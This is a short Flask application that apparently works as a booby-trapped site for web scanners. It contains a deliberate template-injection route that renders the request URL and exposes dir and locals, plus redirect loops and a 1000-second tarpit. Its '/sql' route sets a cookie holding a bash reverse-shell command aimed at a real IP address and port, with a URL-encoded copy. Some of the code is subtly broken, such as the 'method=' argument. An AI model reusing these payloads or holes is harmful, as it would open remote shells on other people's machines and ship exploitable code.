# !/usr/bin/env python
#  -*- coding: utf-8 -*-
from flask import Flask, render_template, request, render_template_string, redirect
from flask import make_response, session
from config import Config
import random
import time
from urllib import urlencode

app = Flask(__name__)
app.config.from_object(Config)


@app.route('/')
@app.route('/1')
def main1():
    template = '''{%% extends "base.html" %%}
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template, dir=dir, help=help, locals=locals)


@app.route('/2')
def main2():
    return render_template('evil.html', url=request.args.get('p'))


@app.route('/3')
def main3():
    return render_template('evil.html')


@app.route('/c1')
def c1():
    return redirect('/c2?' + getrandint())


@app.route('/c2')
def c2():
    return redirect('/c3?' + getrandint())


@app.route('/c3')
def c3():
    return redirect('/c1?' + getrandint())


@app.errorhandler(404)
def page_not_found(e):
    time.sleep(1000)
    return redirect('/' + getrandint() + '/' + getrandint() + '.html')


def getrandint():
    return ''.join(str(random.randint(1, 9)) for i in range(10))


@app.route('/sql', method=['GET', 'POST'])
def sql():
    name = '_csrf_token'
    token = '"shell`bash -i >& /dev/tcp/119.29.235.20/12345 0>&1`111"'
    en_token = '%22%73%68%65%6C%6C%60%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%31%31%39%2E%32%39%2E%32%33%35%2E%32%30%2F%31%32%33%34%35%20%30%3E%26%31%60%31%31%31%22'

    # if not request.args.get(name):
    #     return redirect('/sql?' + name + '=' + token)
    rep = make_response(render_template('sql.html'))
    rep.set_cookie(name, token)
    return rep


# def index():
#     resp = make_response( render_template(...) )  #不明白这一行的 ... 是什么意思
# resp.set_cookie('username', 'the username')

if __name__ == '__main__':
    app.run()
